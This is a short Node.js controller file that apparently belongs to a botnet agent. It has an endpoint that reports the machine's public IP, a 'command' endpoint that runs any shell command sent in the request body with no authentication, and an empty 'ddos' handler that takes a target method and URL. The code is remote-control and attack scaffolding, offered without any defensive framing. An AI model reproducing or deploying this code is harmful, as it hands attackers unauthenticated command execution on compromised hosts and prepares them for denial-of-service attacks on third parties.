const axios = require("axios");
const { exec } = require("child_process");
const ctrl = {};

ctrl.ip = async (req, res) => {
  await axios
    .get("https://ifconfig.me/")
    .then((x) => {
      res.status(200).json({
        ip: x.data,
      });
    })
    .catch(() => {
      res.status(200).json({
        message: "Failed to get IP",
      });
    });
};

ctrl.command = (req, res) => {
  exec(req.body.command);
  res.status(200).json({
    message: "Executed",
  });
};

ctrl.ddos = (req, res) => {
  const { method, url } = req.body;
  
};
